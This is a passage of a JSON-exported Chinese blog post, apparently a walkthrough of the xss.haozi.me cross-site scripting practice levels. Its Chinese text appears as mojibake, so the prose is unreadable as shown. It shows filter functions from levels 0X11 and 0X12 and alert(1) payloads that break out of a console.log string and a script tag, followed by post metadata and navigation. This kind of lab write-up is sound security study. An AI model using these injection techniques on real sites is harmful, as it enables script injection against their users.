punctuation\">.</span><span class=\"token function\">click</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>å¯ä»¥å‘ç°è¿™é‡Œé™¤äº†<code>()</code>ä¹‹å¤–éƒ½è¿›è¡Œäº†è¿‡æ»¤ï¼Œç„¶åçœ‹åˆ°<code>  var url = &#39;javascript:console.log(&quot;$&#123;s&#125;&quot;)&#39;</code>è¿™ä¸ªè¯­å¥ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦æ„é€ å‡ºå•ç‹¬çš„<code>alert(1)</code>å°±å¯ä»¥æˆåŠŸè§¦å‘xssï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆé—­åˆè¿™ä¸ªè¯­å¥ï¼Œè¿™æ—¶å€™ç”¨<code>&quot;);</code>æ¥è¿›è¡Œé—­åˆï¼Œè€Œåæ·»åŠ æˆ‘ä»¬çš„<code>alert(1)</code>,æ­¤æ—¶å› ä¸ºåé¢å¤šå‡ºäº†<code>&quot;)</code>ï¼Œæˆ‘ä»¬éœ€è¦é—­åˆï¼Œæ‰€ä»¥åŠ ä¸Š<code>(&quot;</code>ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token string\">\");alert(1)(\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537002.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X12\"><a href=\"#0X12\" class=\"headerlink\" title=\"0X12\"></a>0X12</h2><p>é¢˜ç›®å¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// from alf.nu</span>\nfunction escape <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  s <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token string\">\"/g, '\\\\\"</span>'<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> '<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"' + s + '\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>'\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>ä»…ä»…åªè¿‡æ»¤äº†<code>/</code>,è¿™é‡Œçš„è¯æˆ‘ä»¬ç›´æ¥æŠŠè¿™ä¸ªæ ‡ç­¾ç»™é—­åˆäº†ï¼Œè‡ªå·±å†æ„é€ ä¸€ä¸ªscriptæ ‡ç­¾æ¥å†™å…¥æˆ‘ä»¬çš„xssä»£ç å³å¯</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537025.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n","feature":true,"text":"å‰è¨€XSSå­¦ä¹ è¿‡åï¼Œæƒ³åˆ·ä¸€äº›é¢˜ï¼Œgithubæ‰¾åˆ°ä¸€ä¸ªï¼Œé“¾æ¥å¦‚ä¸‹https://xss.haozi.me/ 0X00function render (input) &#123; return '&lt;div>' + input + '&lt;/div>' &#125; çœ‹åˆ°æœåŠ¡ç«¯...","link":"","photos":[],"count_time":{"symbolsCount":"7.7k","symbolsTime":"7 mins."},"categories":[{"name":"WEBçŸ¥è¯†","slug":"WEBçŸ¥è¯†","count":23,"path":"api/categories/WEBçŸ¥è¯†.json"}],"tags":[{"name":"XSS","slug":"XSS","count":2,"path":"api/tags/XSS.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">å‰è¨€</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X00\"><span class=\"toc-text\">0X00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X01\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X02\"><span class=\"toc-text\">0X02</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">æ–¹æ³•ä¸€</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">æ–¹æ³•äºŒ</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X03\"><span class=\"toc-text\">0X03</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">å®ä½“ç¼–ç ç»•è¿‡</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">åå¼•å·ç»•è¿‡</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X04\"><span class=\"toc-text\">0X04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X05\"><span class=\"toc-text\">0X05</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X06\"><span class=\"toc-text\">0X06</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X07\"><span class=\"toc-text\">0X07</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X08\"><span class=\"toc-text\">0X08</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X09\"><span class=\"toc-text\">0X09</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0A\"><span class=\"toc-text\">0X0A</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0B\"><span class=\"toc-text\">0X0B</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0C\"><span class=\"toc-text\">0X0C</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0D\"><span class=\"toc-text\">0X0D</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0E\"><span class=\"toc-text\">0X0E</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0F\"><span class=\"toc-text\">0X0F</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X10\"><span class=\"toc-text\">0X10</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X11\"><span class=\"toc-text\">0X11</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X12\"><span class=\"toc-text\">0X12</span></a></li></ol></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"å›½å®¶ä¸€çº§ä¿æŠ¤åºŸç‰©","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"ä»å¤šä¸ªåŸºç¡€CMSå…¥å‘ä»£ç å®¡è®¡","uid":"18629f2c244b07dcae82afe166d98af9","slug":"ä»å¤šä¸ªåŸºç¡€CMSå…¥å‘ä»£ç å®¡è®¡","date":"2022-07-20T17:41:30.000Z","updated":"2024-02-14T07:30:38.000Z","comments":true,"path":"api/articles/ä»å¤šä¸ªåŸºç¡€CMSå…¥å‘ä»£ç å®¡è®¡.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141758128.png","text":"ä»£ç å®¡è®¡æ¦‚å¿µä»€ä¹ˆæ˜¯ä»£ç å®¡è®¡ï¼Ÿ ä»£ç å®¡è®¡æ˜¯åœ¨ä¸€ä¸ªç¼–ç¨‹ä¸­å¯¹æºä»£ç æ—¨åœ¨å‘ç°é”™è¯¯ã€å®‰å…¨æ¼æ´æˆ–è¿åç¼–ç¨‹çº¦å®šçš„é¡¹ç›®ã€‚è¯´äººè¯å°±æ˜¯æ‰¾å®ƒè¿™äº›ä»£ç ä¸­å¯èƒ½å­˜åœ¨é—®é¢˜çš„åœ°æ–¹ï¼Œç„¶åçœ‹å®ƒæ˜¯å¦çœŸçš„å­˜åœ¨æ¼æ´ã€‚(åšä¸»å°ç™½ï¼Œå¯èƒ½å­˜åœ¨é—®é¢˜ï¼Œè¯·è§è°…) åˆ†ç±»ä»£ç å®¡è®¡çš„è¯å¤§è‡´åˆ†ä¸ºä¸‰ç§ï¼Œç™½ç›’ã€é»‘ç›’å’Œç°ç›’ ç™½ç›’æµ‹è¯•è¾ƒä¸ºå®˜æ–¹çš„å®šä¹‰...","link":"","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 mins."},"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","count":7,"path":"api/categories/ä»£ç å®¡è®¡.json"}],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","count":6,"path":"api/tags/ä»£ç å®¡è®¡.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"å›½å®¶ä¸€çº§ä¿æŠ¤åºŸç‰©","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"XSSå¸¸è§ç»•è¿‡å§¿åŠ¿å’Œç»•æŸç‹—WAFæ‰€ç”¨æ ‡ç­¾å°è®°","uid":"ff5ef1580e1509b5812626f28a444a2d","slug":"XSSå¸¸è§ç»•è¿‡å§¿åŠ¿å’Œç»•æŸç‹—WAFæ‰€ç”¨æ ‡ç­¾å°è®°","date":"2022-07-11T10:32:20.000Z","updated":"2024-02-14T07:37:02.000Z","comments":true,"path":"api/articles/XSSå¸¸è§ç»•è¿‡å§¿åŠ¿å’Œç»•æŸç‹—WAFæ‰€ç”¨æ ‡ç­¾å°è®°.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141536202.png","text":"å‰è¨€ä¹‹å‰åœ¨XSSæ–¹é¢åªæœ‰å¾ˆæµ…çš„äº†è§£ï¼Œå†æ¬¡å­¦ä¹ è¿‡åï¼Œè¿™é‡Œå¯¹å…¶éƒ¨åˆ†çŸ¥è¯†è¿›è¡Œæ€»ç»“ï¼ŒåŒæ—¶ç”¨ä¾‹é¢˜æ¥è®²è§£ï¼Œå¸Œæœ›èƒ½å¯¹åœ¨å­¦ä¹ XSSçš„å¸ˆå‚…æœ‰æ‰€å¸®åŠ© ä»€ä¹ˆæ˜¯XSSXSSï¼Œå…¨æ‹¼Cross Site Scriptingï¼Œä¸­æ–‡å«ä¹‰æ˜¯è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œä¸ºäº†ä¸å’Œå±‚å æ ·å¼è¡¨(Cascading Style Shee...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"WEBçŸ¥è¯†","slug":"WEBçŸ¥è¯†","count":23,"path":"api/categories/WEBçŸ¥è¯†.json"}],"tags":[{"name":"XSS","slug":"XSS","count":2,"path":"api/tags/XSS.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"å›½å®¶ä¸€çº§ä¿æŠ¤åºŸç‰©","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}